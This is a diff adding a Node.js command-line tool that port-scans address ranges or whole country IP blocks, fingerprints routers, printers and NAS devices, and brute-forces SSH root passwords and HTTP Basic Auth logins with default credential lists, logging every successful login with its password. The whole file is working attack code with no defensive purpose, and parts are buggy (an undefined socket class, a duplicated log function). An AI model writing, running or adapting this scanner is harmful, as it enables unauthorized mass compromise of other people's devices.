@@ -1,0 +1,513 @@
+#!/usr/bin/env node
+
+/* need multiple passes to account for network funkiness. */
+/* set timeouts higher for slower conections/hardware? */
+
+/* Now, scrape 200'd response for form. */
+
+/* change request userAgent?  What is it now? */
+
+/* Todo: unify SSH querying, HTTP scraping, etc. under one instance of qjobs. */
+
+// these aren't so much "keyWORDs" anymore as "identifiers"...
+// for example, #cc9999 is the color of Linksys' default 401 page :)
+var keywords = ['tp-link', 'linksys', 'wrt', 'cc9999', '6665cb', 'netgear', 'dwl',
+	'belkin', 'seagate', 'cisco', 'valet', 'asus', 'buffalo', 'rosewill',
+	'trendnet', 'windweb', 'canon', 'xerox', 'lexmark', 'laserjet'];
+
+// these devices confound the 200-response-code-checking mechanism
+var blacklist = ['DI-804HV', 'snom 300'];
+
+// blank username case will succeed w/*any* username
+var usernames = ['', 'admin', 'root', 'user', 'manager'];
+var passwords = ['', 'admin', 'root', 'pass', 'password', '1234', '0000', 'friend', '*?'];
+
+var	evilscan = require('evilscan'),
+	fs = require('fs'),
+	geoip = require('geoip-lite'),
+	open = require('open'),
+	options = require('commander'),
+	qJobs = new require('qjobs'),
+	request = require('request'),
+	// Socket = require('net').Socket,
+	SSHConnection = require('ssh2');
+
+var dict = null,
+	deferred = [];
+
+/* Todo - add automated IP block (range) lookup based on current
+	(ISP or otherwise) location, or by city/ZIP code?
+*/
+
+function parseAddr(addr) {
+	var octets = new Array(4);
+	var raw = addr.split('.');
+	if (raw.length != 4) die("Malformed address");
+
+	for (var i = 0; i < octets.length; i++) {
+		var rawOctet = raw[i];
+		if (rawOctet.indexOf('-') === -1)
+			octets[i] = new Octet(rawOctet, rawOctet);
+		else {
+			beginAndEnd = rawOctet.split('-');
+			octets[i] = new Octet(beginAndEnd[0], beginAndEnd[1]);
+		}
+	}
+
+	return octets;
+}
+
+function parsePort(port) {
+	if (port.indexOf(',') !== -1)
+		return port.split(',').map(Number);
+	else {
+		var arr = [];
+		if (port.indexOf('-') !== -1) {
+			var bounds = port.split('-').map(Number);
+			for (var p = bounds[0]; p <= bounds[1]; p++)
+				arr.push(p);
+		}
+		else arr.push(parseInt(port));
+		return arr;
+	}
+}
+
+function parseCC(cc) {
+	return cc.substring(0, 2).toLowerCase();
+}
+
+options
+	.version('0.0.72')
+	// wow, I didn't know comments could go here! :)
+	.option('-a, --address <s>', "Address or CIDR address range to scan")
+	.option('-c, --country <n>', "Two-letter country code to scan IP block in", parseCC)
+	.option('-d, --dictionary <s>', "Dictionary for ssh hosts")
+	.option('-l, --login [n]', "Attempt HTTP BAA login if applicable")
+	//.option('-n, --lognum', "Maximum number of successful logins to log")
+	.option('-o, --output <s>', "File to log successful auths to")
+	.option('-p, --port <s>', "Port(s) to scan")
+	.option('-r, --random [n]', "DEPRECATED: Number of random addresses to scan (overrides --address)")
+	.option('-t, --timeout <n>', "Scanning socket timeout, in ms", parseInt)
+	.parse(process.argv);
+
+// console.log("address: %s; port: %d", options.address, options.port);
+
+if (!(options.address || options.random || options.country) || !options.port) 
+	die("Please specify address and port [ranges]");
+if (!options.timeout)
+	options.timeout = 5000;
+switch (typeof options.login) {
+	case 'string': options.login = parseInt(options.login); break;
+	case 'boolean': options.login = 1; break;
+	case 'undefined': options.login = 0; break;
+}
+
+// does consider trailing newline
+// does NOT currently use qjobs, and it should!
+if (options.dictionary)
+	fs.readFile('./pass/' + options.dictionary,
+		{encoding: 'utf-8'}, function(err, data) {
+		if (err) die(err);
+		dict = data.split('\n');
+		if (dict[dict.length - 1] === '')	// EOF becomes '' 
+			dict.pop();
+
+		// should have used objects... make a host object.
+		deferred.forEach(function(host) {
+			var addrPort = host.split(':');
+			check(addrPort[0], addrPort[1], null);
+		});
+	});
+
+
+if (options.country) scanFromCSV();
+else scan({
+	target: options.address,
+	port: options.port,
+	status: 'O',
+	// do geo elsewhere... seems not to be supported in evilscan-libapp
+	// more efficient that way, and more full lookup w/heftier files
+});
+
+function scanRandom() {
+	// if number to scan not specified,
+	// options.random will be boolean true
+	for (var i = 0; i < Number(options.random); i++) {
+		var arr = [];
+		for (var j = 0; j < 4; j++) {
+			arr.push(Math.floor(Math.random() * 256));
+		}
+		options.port.forEach(function(port) {
+			checkStatus(arr.join(':'),
+				port, options.timeout, checkIfOpen);
+		});
+	}
+}
+
+// TODO: clean up CSV parsing below
+function scanFromCSV() {
+	var reqStr = 'http://www.nirsoft.net/countryip/' + options.country + '.csv';
+	console.log(reqStr);
+	request(reqStr, function(err, res, body) {
+        if (!err && res.statusCode === 200) {
+        	// sloppy, but no need to replace with a library...
+        	// just unify the code a little better instead.
+            var arr = body.toString('utf-8').split('\r\n');
+            var entry = arr[Math.floor(Math.random() * arr.length)];
+            var firstComma = entry.indexOf(',');
+            var secondComma = entry.indexOf(',', firstComma + 1);
+            var thirdComma = entry.indexOf(',', secondComma + 1);
+            var target = entry.substring(0, firstComma) + '/';
+            var numToScan = entry.substring(secondComma + 1, thirdComma);
+            target += 32 - ((Math.log(numToScan) / Math.log(2)));
+            console.log('INITIATING SCAN: ' + target);
+            scan({
+               	target: target,
+               	port: options.port,
+               	status: 'O'
+               	// again, do geo elsewhere
+            });
+        }
+        else die("Invalid country code given");
+	});
+
+}
+
+function log(b, n) {
+    return Math.log(n) / Math.log(b);
+}
+
+function scanGiven() {
+	// almost guarantee there's a cleaner, FP way to do this...
+	var octs = options.address;
+	for (var oct1 = octs[0].begin; oct1 <= octs[0].end; oct1++) {
+		for (var oct2 = octs[1].begin; oct2 <= octs[1].end; oct2++) {
+			for (var oct3 = octs[2].begin; oct3 <= octs[2].end; oct3++) {
+				for (var oct4 = octs[3].begin; oct4 <= octs[3].end; oct4++) {
+					var addr = oct1 + '.' + oct2 + '.' + oct3 + '.' + oct4;
+					options.port.forEach(function(port) {
+						checkStatus(addr, port,
+							options.timeout, checkIfOpen);
+					});
+				}
+			}
+		}
+	}
+	// issue processing callback here?
+}
+
+function scan(options) {
+	// var scanInstance = new Evilscan...
+	// 512 is concurrency for http only
+	var httpQueue = new qJobs({maxConcurrency: 1024});
+	// httpQueue.on('jobStart', function(args) {
+ //    	console.log('jobStart', args);
+	// });
+	new evilscan(options, function(scanner) {
+		scanner.on('result', portSwitch(httpQueue));
+		scanner.on('error', function(err) {
+			console.error(err);
+		});
+		scanner.on('done', function() {
+			console.log("PORT SCAN COMPLETE");
+		});
+		scanner.run();
+	});
+}
+
+// "trap" the extra needed httpQueue parameter w/a closure
+function portSwitch(queue) {
+	// evilscanner maintains its own qjobs-based
+	// concurrency limiter, so we need only one
+	// more queue here for service-checking conc.
+	return function(data) {
+		switch(data.port) {
+			case 22: if (options.dictionary) {
+				check(data.ip, data.port, q);
+			}
+			break;
+			case 23: break;
+			case 80: scrape(data.ip, data.port, queue); break;
+			}
+	}
+}
+
+// [begin, end] (inclusive for both)
+function Octet(begin, end) {
+	this.begin = Number(begin);
+	this.end = Number(end);
+	if (this.begin > this.end)
+		this.begin = [this.end, this.end = this.begin][0];	
+}
+
+// if (msg) unneeded...
+function die(msg) {
+	if (msg) console.error('fatal: ' + msg + '\n');
+	process.exit(1);
+}
+
+// start from "switch" below (wipe everything prior) when transitioning to evil
+// switch based on connection type here.
+function checkIfOpen(error, status, addr, port) {
+	if (status === 'open') {
+		prettyPrint(addr, port, null, geoip.lookup(addr));
+
+		switch (port) {
+			// if (options.dictionary)
+			// then, load the dictionary
+			case 22: if (options.dictionary) {
+				check(addr, port); break;
+			}
+			case 23: break;
+			// case 8080:
+			case 80: scrape(addr, port); break;
+		}
+	}
+}
+
+/*  
+	Get some information about the client to determine
+	whether/not it's worth our time.  For example, if
+	the client only supports var scan public key authentication,
+	it's not worth it.
+*/
+function check(addr, port, q) {
+	(new SSHConnection())
+		.on('ready', function() {
+			console.log("Succeeded using 'test' as password");
+		})
+		.on('error', function(err) {
+			// Unfortunately, supported login methods are
+			// only accessible using toString().
+			// Blame the author of ssh2, not me.
+			var attackable = ((err.level === 'authentication') &&
+				((err.toString().indexOf('password') != -1) ||
+				(err.toString().indexOf('keyboard-interactive') != -1)));
+
+			if (attackable) {
+				if (dict) attack(addr, port, q);
+				else deferred.push(addr + ":" + port);
+			}
+		})
+		.on('connect', function() {
+			console.log("confirmed: host has SSH");
+		})
+		.connect({
+			host: addr,
+			port: port,
+			username: 'root',
+			password: 'test'
+		});
+}
+
+// TODO: implement adaptive rate limiting via error level callback, ECONNRESET
+function attack(addr, port, q) {
+	for (var i = 0; i < dict.length; i++) {
+		pass = dict[i];
+
+		q.add(function() {
+			(new SSHConnection())
+				.on('connect', function() {
+					// console.log(connected: using %s', pass);
+					process.stdout.write('^');
+				})
+				.on('ready', function() {
+					console.log('Succeeded: using %s', pass);
+					log('ssh://root@' + addr + ':' + port + ' [' + pass + ']');
+					// return;	// this is why we can't use a forEach construct???
+				})
+				.on('error', function(err) {
+					// console.log(err);
+					if (err.level === 'authentication')
+						process.stdout.write('.');
+					else if (err.level === 'connection-socket')
+						process.stdout.write('x');
+					else process.stdout.write('?');
+				})
+				.on('end', function() {
+					// console.log('Socket disconnected');
+				})
+				.on('close', function(had_error) {
+					// console.log('Socket closed; error: %s', had_error);
+				})
+				.connect({
+					host: addr,
+					port: port,
+					username: 'root',
+					password: pass
+				});
+		});
+	}
+	q.run();
+}
+
+// wrapper to conform to qjobs' weird argument-passing conventions
+function requestWrapper(args, next) {
+	// have decided to call queue.run() after
+	// adding each job, as opposed to calling
+	// next() in the callback itself (is that
+	// how qjobs' next() works?)
+	request(args[0], args[1]);
+}
+
+// https, too?
+function scrape(addr, port, queue) {
+	// pseudocode var uri = (port === 443) ? 'https://' : 'http://'
+	queue.add(requestWrapper, [{
+		uri: 'http://' + addr,
+		timeout: 5000
+
+		}, function(error, response, body) {
+
+		// if (!body) console.log("could not get page source");	
+
+		// find out what's up here!
+		// console.log(error);
+		// console.log(body);
+/* HACK BELOW */
+
+		// if (!error && response.statusCode == 200) {
+		// if (!error) {
+		if (body) {
+			if (response.statusCode === 401) {
+				prettyPrint(addr, port, getRealm(response
+					.headers['www-authenticate']), geoip.lookup(addr));
+				if (options.login) attemptBAA(addr, port, queue);
+			}
+			else {
+				// keywords.forEach(function(keyword) {
+				// 	var regex = new RegExp(keyword, 'i');
+				// 	if (body.match(regex)) {
+				// 		prettyPrint(addr, port, keyword, geoip.lookup(addr));
+				// 		// need to watch for too many file descriptors
+				// 		// got an error, previously
+				// 		// open(uri, 'firefox');
+				// 	}	
+				// });
+			}
+		}
+	}]);
+	queue.run();
+}
+
+function attemptBAA(addr, port, queue) {
+	// realm needs to persist across multiple user:pass HTTP requests,
+	// since realm won't be re-sent when we do get a 200 response
+
+	// TODO: need better error checking up top,
+	// so that options.login is GUARANTEED to be >= 1 here
+	var realm, numToLog = options.login;
+	usernames.forEach(function(user) {
+		passwords.forEach(function(pass) {
+			queue.add(requestWrapper, [{
+				uri: 'http://' + addr,
+				auth: {
+					username: user,
+					password: pass
+				},
+				timeout: 5000
+			},
+			function(error, response, body) {
+				if (response) {
+					if (!realm)
+							realm = getRealm(response.headers['www-authenticate']);
+					switch (response.statusCode) {
+						case 200: {
+							//should already be a utf-8 buffer, but w/e
+							var regEx = /<title[^>]*>(.*?)<\/title>/i;
+							var title = regEx.exec(body.toString('utf-8'));
+							if (title) title = title[1];
+
+							// if ((blacklist.indexOf(realm) === -1) && (blacklist.indexOf(title) === -1))
+							console.log('SUCCESS: http://%s:%s@%s:%s ++|%s - %s|++',
+								user, pass, addr, port, realm, title);
+							var authURI = 'http://' + user + ':' + pass + '@' + addr;
+							// open(authURI, 'firefox');
+							if (options.output && numToLog) {
+								// could just mute authURI, but that seemed bad...
+								var toLog = authURI;
+								if (realm) toLog += ' [' + realm + ']';
+								if (title) toLog += ' - ' + title;
+								// if ((blacklist.indexOf(realm) === -1) && (blacklist.indexOf(title) === -1))
+								log(toLog);
+								numToLog--;
+							}
+						}; break;
+						case 401: {
+							process.stdout.write('.');
+						}; break;
+					}
+				}
+			}]);
+			queue.run();
+		});
+	});
+}
+
+// This sucks.  Use conditional regex next time.
+function getRealm(header) {
+	if (header) {
+		var startToken = 'Basic realm="';
+		var start = header.indexOf(startToken) + startToken.length;
+		var end = header.indexOf('"', start);
+		return header.substring(start, end);
+	}
+	else return null;	// return undefined instead?
+}
+
+// var prev = '';
+function prettyPrint(addr, port, keyword, geo) {
+	var msg = addr + ':' + port;
+	if (keyword) msg += ' [' + keyword + ']';
+	if (geo) {
+		msg += ' (';
+		if (geo.city) msg += geo.city;
+		if (geo.region) msg += ', ' + geo.region;
+		if (geo.region && geo.country) msg += ' ';
+		if (geo.country) msg += geo.country;
+		msg += ')';
+	}
+	console.log(msg);
+}
+
+function checkStatus(host, port, timeout, callback) {
+	// little to no problem here... it's getting all addresses
+ 	host = host || 'localhost';
+  	var socket = new Socket(),
+        status = null;
+
+    socket.setTimeout(timeout);
+    socket.on('connect', function() {
+    	status = 'open';
+    	socket.end();
+  	})
+  	.on('error', function(exception) {
+  		console.log("error: %s:%d", host, port);
+  		console.log(exception);
+    	status = 'closed'
+  	})
+  	.on('timeout', function() {
+  		console.log(",")
+    	status = 'closed'
+    	socket.destroy();
+    })
+  	.on('close', function(exception) {
+    	callback(exception, status, host, port)
+  	})
+  	.connect(port, host);
+}
+
+function log(msg) {
+	fs.appendFile('./' + options.output, msg + '\n', function(err) {
+		if (err) die(err);
+	});
+}
+
+// may or may not end up using this
+function Pair(ip, port) {
+	this.ip = ip;
+	this.port = port;
+}
+Pair.prototype.toString = function() {
+	return this.ip + ':' + this.port;
+}
